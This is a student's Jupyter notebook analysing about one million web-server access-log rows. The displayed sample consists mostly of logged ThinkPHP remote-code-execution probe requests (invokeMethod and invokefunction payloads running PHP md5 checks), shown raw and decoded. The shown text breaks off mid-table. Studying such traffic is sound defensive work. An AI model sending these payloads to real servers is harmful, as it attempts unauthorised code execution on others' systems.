{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "8a4e785d-698b-4637-8ab6-b97d59c8aac4",
   "metadata": {},
   "source": [
    "# Análisis inferencial de trafico en servidores web\n",
    "## Mitsiu Alejandro Carreño Sarabia E23S-18014\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dc09a2f5-7b5b-455f-abc3-18328235efee",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import pyarrow.parquet as pq\n",
    "import numpy as np"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "id": "a7c52351-49f6-4492-9297-f82b2bd07971",
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "pd.set_option('display.max_rows', None)\n",
    "pd.set_option('display.max_colwidth', None)\n",
    "pd.set_option('display.max_columns', None)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "c9917e61-b026-4e30-af74-ab35acafbb85",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(1017176, 22)"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df = pd.read_parquet(\"./full2.parquet\")\n",
    "df.shape"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7cda2700-4327-412a-8f6e-bff7c23729ea",
   "metadata": {},
   "source": [
    "## Exploración de datos"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "id": "25ed08c5-3023-46fd-80f2-52fd2add62cc",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>remote_addr</th>\n",
       "      <th>remote_usr</th>\n",
       "      <th>date_time</th>\n",
       "      <th>date</th>\n",
       "      <th>time</th>\n",
       "      <th>request</th>\n",
       "      <th>req_method</th>\n",
       "      <th>req_uri</th>\n",
       "      <th>http_ver</th>\n",
       "      <th>status</th>\n",
       "      <th>body_bytes_sent</th>\n",
       "      <th>http_referer</th>\n",
       "      <th>user_agent</th>\n",
       "      <th>dec_req_uri</th>\n",
       "      <th>clean_path</th>\n",
       "      <th>clean_query_list</th>\n",
       "      <th>domain</th>\n",
       "      <th>fdate</th>\n",
       "      <th>dateunixtimest</th>\n",
       "      <th>ftime</th>\n",
       "      <th>fabstime</th>\n",
       "      <th>fdatetime</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>185.213.174.190</td>\n",
       "      <td>-</td>\n",
       "      <td>[27/Jun/2023:07:12:12 -0600]</td>\n",
       "      <td>27/Jun/2023</td>\n",
       "      <td>07:12:12</td>\n",
       "      <td>\"GET / HTTP/1.1\"</td>\n",
       "      <td>GET</td>\n",
       "      <td>/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>502.0</td>\n",
       "      <td>575.0</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</td>\n",
       "      <td>/</td>\n",
       "      <td>/</td>\n",
       "      <td>[]</td>\n",
       "      <td></td>\n",
       "      <td>2023-06-27</td>\n",
       "      <td>1.687824e+09</td>\n",
       "      <td>07:12:12</td>\n",
       "      <td>7.2</td>\n",
       "      <td>2023-06-27 07:12:12</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>185.213.174.190</td>\n",
       "      <td>-</td>\n",
       "      <td>[27/Jun/2023:07:12:12 -0600]</td>\n",
       "      <td>27/Jun/2023</td>\n",
       "      <td>07:12:12</td>\n",
       "      <td>\"GET /index.php?s=/index/think%5Capp/invokeMethod&amp;method[0]=think%5Cview%5Cdriver%5CPhp&amp;method[1]=display&amp;vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27); HTTP/1.1\"</td>\n",
       "      <td>GET</td>\n",
       "      <td>/index.php?s=/index/think%5Capp/invokeMethod&amp;method[0]=think%5Cview%5Cdriver%5CPhp&amp;method[1]=display&amp;vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27);</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>502.0</td>\n",
       "      <td>575.0</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</td>\n",
       "      <td>/index.php?s=/index/think\\app/invokeMethod&amp;method[0]=think\\view\\driver\\Php&amp;method[1]=display&amp;vars[0]=&lt;?php echo md5('1f3870be274f6c49b3e31a0c6728957f');</td>\n",
       "      <td>/index.php</td>\n",
       "      <td>[[s, /index/think\\app/invokeMethod], [method[0], think\\view\\driver\\Php], [method[1], display], [vars[0], &lt;?php echo md5('1f3870be274f6c49b3e31a0c6728957f');]]</td>\n",
       "      <td></td>\n",
       "      <td>2023-06-27</td>\n",
       "      <td>1.687824e+09</td>\n",
       "      <td>07:12:12</td>\n",
       "      <td>7.2</td>\n",
       "      <td>2023-06-27 07:12:12</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>185.213.174.190</td>\n",
       "      <td>-</td>\n",
       "      <td>[27/Jun/2023:07:12:13 -0600]</td>\n",
       "      <td>27/Jun/2023</td>\n",
       "      <td>07:12:13</td>\n",
       "      <td>\"GET /index.php?s=/admin/think%5Capp/invokeMethod&amp;method[0]=think%5Cview%5Cdriver%5CPhp&amp;method[1]=display&amp;vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27); HTTP/1.1\"</td>\n",
       "      <td>GET</td>\n",
       "      <td>/index.php?s=/admin/think%5Capp/invokeMethod&amp;method[0]=think%5Cview%5Cdriver%5CPhp&amp;method[1]=display&amp;vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27);</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>502.0</td>\n",
       "      <td>575.0</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</td>\n",
       "      <td>/index.php?s=/admin/think\\app/invokeMethod&amp;method[0]=think\\view\\driver\\Php&amp;method[1]=display&amp;vars[0]=&lt;?php echo md5('1f3870be274f6c49b3e31a0c6728957f');</td>\n",
       "      <td>/index.php</td>\n",
       "      <td>[[s, /admin/think\\app/invokeMethod], [method[0], think\\view\\driver\\Php], [method[1], display], [vars[0], &lt;?php echo md5('1f3870be274f6c49b3e31a0c6728957f');]]</td>\n",
       "      <td></td>\n",
       "      <td>2023-06-27</td>\n",
       "      <td>1.687824e+09</td>\n",
       "      <td>07:12:13</td>\n",
       "      <td>7.2</td>\n",
       "      <td>2023-06-27 07:12:13</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>185.213.174.190</td>\n",
       "      <td>-</td>\n",
       "      <td>[27/Jun/2023:07:12:14 -0600]</td>\n",
       "      <td>27/Jun/2023</td>\n",
       "      <td>07:12:14</td>\n",
       "      <td>\"GET /index.php?s=/api/think%5Capp/invokeMethod&amp;method[0]=think%5Cview%5Cdriver%5CPhp&amp;method[1]=display&amp;vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27); HTTP/1.1\"</td>\n",
       "      <td>GET</td>\n",
       "      <td>/index.php?s=/api/think%5Capp/invokeMethod&amp;method[0]=think%5Cview%5Cdriver%5CPhp&amp;method[1]=display&amp;vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27);</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>502.0</td>\n",
       "      <td>575.0</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</td>\n",
       "      <td>/index.php?s=/api/think\\app/invokeMethod&amp;method[0]=think\\view\\driver\\Php&amp;method[1]=display&amp;vars[0]=&lt;?php echo md5('1f3870be274f6c49b3e31a0c6728957f');</td>\n",
       "      <td>/index.php</td>\n",
       "      <td>[[s, /api/think\\app/invokeMethod], [method[0], think\\view\\driver\\Php], [method[1], display], [vars[0], &lt;?php echo md5('1f3870be274f6c49b3e31a0c6728957f');]]</td>\n",
       "      <td></td>\n",
       "      <td>2023-06-27</td>\n",
       "      <td>1.687824e+09</td>\n",
       "      <td>07:12:14</td>\n",
       "      <td>7.2</td>\n",
       "      <td>2023-06-27 07:12:14</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>185.213.174.190</td>\n",
       "      <td>-</td>\n",
       "      <td>[27/Jun/2023:07:12:14 -0600]</td>\n",
       "      <td>27/Jun/2023</td>\n",
       "      <td>07:12:14</td>\n",
       "      <td>\"GET /index.php?s=/home/think%5Capp/invokeMethod&amp;method[0]=think%5Cview%5Cdriver%5CPhp&amp;method[1]=display&amp;vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27); HTTP/1.1\"</td>\n",
       "      <td>GET</td>\n",
       "      <td>/index.php?s=/home/think%5Capp/invokeMethod&amp;method[0]=think%5Cview%5Cdriver%5CPhp&amp;method[1]=display&amp;vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27);</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>502.0</td>\n",
       "      <td>575.0</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</td>\n",
       "      <td>/index.php?s=/home/think\\app/invokeMethod&amp;method[0]=think\\view\\driver\\Php&amp;method[1]=display&amp;vars[0]=&lt;?php echo md5('1f3870be274f6c49b3e31a0c6728957f');</td>\n",
       "      <td>/index.php</td>\n",
       "      <td>[[s, /home/think\\app/invokeMethod], [method[0], think\\view\\driver\\Php], [method[1], display], [vars[0], &lt;?php echo md5('1f3870be274f6c49b3e31a0c6728957f');]]</td>\n",
       "      <td></td>\n",
       "      <td>2023-06-27</td>\n",
       "      <td>1.687824e+09</td>\n",
       "      <td>07:12:14</td>\n",
       "      <td>7.2</td>\n",
       "      <td>2023-06-27 07:12:14</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>185.213.174.190</td>\n",
       "      <td>-</td>\n",
       "      <td>[27/Jun/2023:07:12:15 -0600]</td>\n",
       "      <td>27/Jun/2023</td>\n",
       "      <td>07:12:15</td>\n",
       "      <td>\"GET /index.php?s=/user/think%5Capp/invokeMethod&amp;method[0]=think%5Cview%5Cdriver%5CPhp&amp;method[1]=display&amp;vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27); HTTP/1.1\"</td>\n",
       "      <td>GET</td>\n",
       "      <td>/index.php?s=/user/think%5Capp/invokeMethod&amp;method[0]=think%5Cview%5Cdriver%5CPhp&amp;method[1]=display&amp;vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27);</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>502.0</td>\n",
       "      <td>575.0</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</td>\n",
       "      <td>/index.php?s=/user/think\\app/invokeMethod&amp;method[0]=think\\view\\driver\\Php&amp;method[1]=display&amp;vars[0]=&lt;?php echo md5('1f3870be274f6c49b3e31a0c6728957f');</td>\n",
       "      <td>/index.php</td>\n",
       "      <td>[[s, /user/think\\app/invokeMethod], [method[0], think\\view\\driver\\Php], [method[1], display], [vars[0], &lt;?php echo md5('1f3870be274f6c49b3e31a0c6728957f');]]</td>\n",
       "      <td></td>\n",
       "      <td>2023-06-27</td>\n",
       "      <td>1.687824e+09</td>\n",
       "      <td>07:12:15</td>\n",
       "      <td>7.2</td>\n",
       "      <td>2023-06-27 07:12:15</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>185.213.174.190</td>\n",
       "      <td>-</td>\n",
       "      <td>[27/Jun/2023:07:12:15 -0600]</td>\n",
       "      <td>27/Jun/2023</td>\n",
       "      <td>07:12:15</td>\n",
       "      <td>\"GET /index.php?s=//think%5Capp/invokeMethod&amp;method[0]=think%5Cview%5Cdriver%5CPhp&amp;method[1]=display&amp;vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27); HTTP/1.1\"</td>\n",
       "      <td>GET</td>\n",
       "      <td>/index.php?s=//think%5Capp/invokeMethod&amp;method[0]=think%5Cview%5Cdriver%5CPhp&amp;method[1]=display&amp;vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27);</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>502.0</td>\n",
       "      <td>575.0</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</td>\n",
       "      <td>/index.php?s=//think\\app/invokeMethod&amp;method[0]=think\\view\\driver\\Php&amp;method[1]=display&amp;vars[0]=&lt;?php echo md5('1f3870be274f6c49b3e31a0c6728957f');</td>\n",
       "      <td>/index.php</td>\n",
       "      <td>[[s, //think\\app/invokeMethod], [method[0], think\\view\\driver\\Php], [method[1], display], [vars[0], &lt;?php echo md5('1f3870be274f6c49b3e31a0c6728957f');]]</td>\n",
       "      <td></td>\n",
       "      <td>2023-06-27</td>\n",
       "      <td>1.687824e+09</td>\n",
       "      <td>07:12:15</td>\n",
       "      <td>7.2</td>\n",
       "      <td>2023-06-27 07:12:15</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>185.213.174.190</td>\n",
       "      <td>-</td>\n",
       "      <td>[27/Jun/2023:07:12:16 -0600]</td>\n",
       "      <td>27/Jun/2023</td>\n",
       "      <td>07:12:16</td>\n",
       "      <td>\"GET /index.php?s=/index/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=1f3870be274f6c49b3e31a0c6728957f HTTP/1.1\"</td>\n",
       "      <td>GET</td>\n",
       "      <td>/index.php?s=/index/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=1f3870be274f6c49b3e31a0c6728957f</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>502.0</td>\n",
       "      <td>575.0</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</td>\n",
       "      <td>/index.php?s=/index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=1f3870be274f6c49b3e31a0c6728957f</td>\n",
       "      <td>/index.php</td>\n",
       "      <td>[[s, /index/think\\app/invokefunction], [function, call_user_func_array], [vars[0], md5], [vars[1][], 1f3870be274f6c49b3e31a0c6728957f]]</td>\n",
       "      <td></td>\n",
       "      <td>2023-06-27</td>\n",
       "      <td>1.687824e+09</td>\n",
       "      <td>07:12:16</td>\n",
       "      <td>7.2</td>\n",
       "      <td>2023-06-27 07:12:16</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>185.213.174.190</td>\n",
       "      <td>-</td>\n",
       "      <td>[27/Jun/2023:07:12:16 -0600]</td>\n",
       "      <td>27/Jun/2023</td>\n",
       "      <td>07:12:16</td>\n",
       "      <td>\"GET /index.php?s=/admin/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=1f3870be274f6c49b3e31a0c6728957f HTTP/1.1\"</td>\n",
       "      <td>GET</td>\n",
       "      <td>/index.php?s=/admin/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=1f3870be274f6c49b3e31a0c6728957f</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>502.0</td>\n",
       "      <td>575.0</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</td>\n",
       "      <td>/index.php?s=/admin/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=1f3870be274f6c49b3e31a0c6728957f</td>\n",
       "      <td>/index.php</td>\n",
       "      <td>[[s, /admin/think\\app/invokefunction], [function, call_user_func_array], [vars[0], md5], [vars[1][], 1f3870be274f6c49b3e31a0c6728957f]]</td>\n",
       "      <td></td>\n",
       "      <td>2023-06-27</td>\n",
       "      <td>1.687824e+09</td>\n",
       "      <td>07:12:16</td>\n",
       "      <td>7.2</td>\n",
       "      <td>2023-06-27 07:12:16</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>185.213.174.190</td>\n",
       "      <td>-</td>\n",
       "      <td>[27/Jun/2023:07:12:16 -0600]</td>\n",
       "      <td>27/Jun/2023</td>\n",
       "      <td>07:12:16</td>\n",
       "      <td>\"GET /index.php?s=/api/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=1f3870be274f6c49b3e31a0c6728957f HTTP/1.1\"</td>\n",
       "      <td>GET</td>\n",
       "      <td>/index.php?s=/api/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=1f3870be274f6c49b3e31a0c6728957f</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>502.0</td>\n",
       "      <td>575.0</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</td>\n",
       "      <td>/index.php?s=/api/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=1f3870be274f6c49b3e31a0c6728957f</td>\n",
       "      <td>/index.php</td>\n",
       "      <td>[[s, /api/think\\app/invokefunction], [function, call_user_func_array], [vars[0], md5], [vars[1][], 1f3870be274f6c49b3e31a0c6728957f]]</td>\n",
       "      <td></td>\n",
       "      <td>2023-06-27</td>\n",
       "      <td>1.687824e+09</td>\n",
       "      <td>07:12:16</td>\n",
       "      <td>7.2</td>\n",
       "      <td>2023-06-27 07:12:16</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "       remote_addr remote_usr                     date_time         date  \\\n",
       "0  185.213.174.190          -  [27/Jun/2023:07:12:12 -0600]  27/Jun/2023   \n",
       "1  185.213.174.190          -  [27/Jun/2023:07:12:12 -0600]  27/Jun/2023   \n",
       "2  185.213.174.190          -  [27/Jun/2023:07:12:13 -0600]  27/Jun/2023   \n",
       "3  185.213.174.190          -  [27/Jun/2023:07:12:14 -0600]  27/Jun/2023   \n",
       "4  185.213.174.190          -  [27/Jun/2023:07:12:14 -0600]  27/Jun/2023   \n",
       "5  185.213.174.190          -  [27/Jun/2023:07:12:15 -0600]  27/Jun/2023   \n",
       "6  185.213.174.190          -  [27/Jun/2023:07:12:15 -0600]  27/Jun/2023   \n",
       "7  185.213.174.190          -  [27/Jun/2023:07:12:16 -0600]  27/Jun/2023   \n",
       "8  185.213.174.190          -  [27/Jun/2023:07:12:16 -0600]  27/Jun/2023   \n",
       "9  185.213.174.190          -  [27/Jun/2023:07:12:16 -0600]  27/Jun/2023   \n",
       "\n",
       "       time  \\\n",
       "0  07:12:12   \n",
       "1  07:12:12   \n",
       "2  07:12:13   \n",
       "3  07:12:14   \n",
       "4  07:12:14   \n",
       "5  07:12:15   \n",
       "6  07:12:15   \n",
       "7  07:12:16   \n",
       "8  07:12:16   \n",
       "9  07:12:16   \n",
       "\n",
       "                                                                                                                                                                                     request  \\\n",
       "0                                                                                                                                                                           \"GET / HTTP/1.1\"   \n",
       "1  \"GET /index.php?s=/index/think%5Capp/invokeMethod&method[0]=think%5Cview%5Cdriver%5CPhp&method[1]=display&vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27); HTTP/1.1\"   \n",
       "2  \"GET /index.php?s=/admin/think%5Capp/invokeMethod&method[0]=think%5Cview%5Cdriver%5CPhp&method[1]=display&vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27); HTTP/1.1\"   \n",
       "3    \"GET /index.php?s=/api/think%5Capp/invokeMethod&method[0]=think%5Cview%5Cdriver%5CPhp&method[1]=display&vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27); HTTP/1.1\"   \n",
       "4   \"GET /index.php?s=/home/think%5Capp/invokeMethod&method[0]=think%5Cview%5Cdriver%5CPhp&method[1]=display&vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27); HTTP/1.1\"   \n",
       "5   \"GET /index.php?s=/user/think%5Capp/invokeMethod&method[0]=think%5Cview%5Cdriver%5CPhp&method[1]=display&vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27); HTTP/1.1\"   \n",
       "6       \"GET /index.php?s=//think%5Capp/invokeMethod&method[0]=think%5Cview%5Cdriver%5CPhp&method[1]=display&vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27); HTTP/1.1\"   \n",
       "7                                         \"GET /index.php?s=/index/think%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1f3870be274f6c49b3e31a0c6728957f HTTP/1.1\"   \n",
       "8                                         \"GET /index.php?s=/admin/think%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1f3870be274f6c49b3e31a0c6728957f HTTP/1.1\"   \n",
       "9                                           \"GET /index.php?s=/api/think%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1f3870be274f6c49b3e31a0c6728957f HTTP/1.1\"   \n",
       "\n",
       "  req_method  \\\n",
       "0        GET   \n",
       "1        GET   \n",
       "2        GET   \n",
       "3        GET   \n",
       "4        GET   \n",
       "5        GET   \n",
       "6        GET   \n",
       "7        GET   \n",
       "8        GET   \n",
       "9        GET   \n",
       "\n",
       "                                                                                                                                                                      req_uri  \\\n",
       "0                                                                                                                                                                           /   \n",
       "1  /index.php?s=/index/think%5Capp/invokeMethod&method[0]=think%5Cview%5Cdriver%5CPhp&method[1]=display&vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27);   \n",
       "2  /index.php?s=/admin/think%5Capp/invokeMethod&method[0]=think%5Cview%5Cdriver%5CPhp&method[1]=display&vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27);   \n",
       "3    /index.php?s=/api/think%5Capp/invokeMethod&method[0]=think%5Cview%5Cdriver%5CPhp&method[1]=display&vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27);   \n",
       "4   /index.php?s=/home/think%5Capp/invokeMethod&method[0]=think%5Cview%5Cdriver%5CPhp&method[1]=display&vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27);   \n",
       "5   /index.php?s=/user/think%5Capp/invokeMethod&method[0]=think%5Cview%5Cdriver%5CPhp&method[1]=display&vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27);   \n",
       "6       /index.php?s=//think%5Capp/invokeMethod&method[0]=think%5Cview%5Cdriver%5CPhp&method[1]=display&vars[0]=%3C?php%20echo%20md5(%271f3870be274f6c49b3e31a0c6728957f%27);   \n",
       "7                                         /index.php?s=/index/think%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1f3870be274f6c49b3e31a0c6728957f   \n",
       "8                                         /index.php?s=/admin/think%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1f3870be274f6c49b3e31a0c6728957f   \n",
       "9                                           /index.php?s=/api/think%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1f3870be274f6c49b3e31a0c6728957f   \n",
       "\n",
       "   http_ver  status  body_bytes_sent http_referer  \\\n",
       "0  HTTP/1.1   502.0            575.0            -   \n",
       "1  HTTP/1.1   502.0            575.0            -   \n",
       "2  HTTP/1.1   502.0            575.0            -   \n",
       "3  HTTP/1.1   502.0            575.0            -   \n",
       "4  HTTP/1.1   502.0            575.0            -   \n",
       "5  HTTP/1.1   502.0            575.0            -   \n",
       "6  HTTP/1.1   502.0            575.0            -   \n",
       "7  HTTP/1.1   502.0            575.0            -   \n",
       "8  HTTP/1.1   502.0            575.0            -   \n",
       "9  HTTP/1.1   502.0            575.0            -   \n",
       "\n",
       "                                                                                                        user_agent  \\\n",
       "0  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36   \n",
       "1  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36   \n",
       "2  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36   \n",
       "3  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36   \n",
       "4  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36   \n",
       "5  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36   \n",
       "6  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36   \n",
       "7  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36   \n",
       "8  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36   \n",
       "9  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36   \n",
       "\n",
       "                                                                                                                                                dec_req_uri  \\\n",
       "0                                                                                                                                                         /   \n",
       "1  /index.php?s=/index/think\\app/invokeMethod&method[0]=think\\view\\driver\\Php&method[1]=display&vars[0]=<?php echo md5('1f3870be274f6c49b3e31a0c6728957f');   \n",
       "2  /index.php?s=/admin/think\\app/invokeMethod&method[0]=think\\view\\driver\\Php&method[1]=display&vars[0]=<?php echo md5('1f3870be274f6c49b3e31a0c6728957f');   \n",
       "3    /index.php?s=/api/think\\app/invokeMethod&method[0]=think\\view\\driver\\Php&method[1]=display&vars[0]=<?php echo md5('1f3870be274f6c49b3e31a0c6728957f');   \n",
       "4   /index.php?s=/home/think\\app/invokeMethod&method[0]=think\\view\\driver\\Php&method[1]=display&vars[0]=<?php echo md5('1f3870be274f6c49b3e31a0c6728957f');   \n",
       "5   /index.php?s=/user/think\\app/invokeMethod&method[0]=think\\view\\driver\\Php&method[1]=display&vars[0]=<?php echo md5('1f3870be274f6c49b3e31a0c6728957f');   \n",
       "6       /index.php?s=//think\\app/invokeMethod&method[0]=think\\view\\driver\\Php&method[1]=display&vars[0]=<?php echo md5('1f3870be274f6c49b3e31a0c6728957f');   \n",
       "7                         /index.php?s=/index/think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1f3870be274f6c49b3e31a0c6728957f   \n",
       "8                         /index.php?s=/admin/think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1f3870be274f6c49b3e31a0c6728957f   \n",
       "9                           /index.php?s=/api/think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1f3870be274f6c49b3e31a0c6728957f   \n",
       "\n",
       "   clean_path  \\\n",
       "0           /   \n",
       "1  /index.php   \n",
       "2  /index.php   \n",
       "3  /index.php   \n",
       "4  /index.php   \n",
       "5  /index.php   \n",
       "6  /index.php   \n",
       "7  /index.php   \n",
       "8  /index.php   \n",
       "9  /index.php   \n",
       "\n",
       "                                                                                                                                                 clean_query_list  \\\n",
       "0                                                                                                                                                              []   \n",
       "1  [[s, /index/think\\app/invokeMethod], [method[0], think\\view\\driver\\Php], [method[1], display], [vars[0], <?php echo md5('1f3870be274f6c49b3e31a0c6728957f');]]   \n",
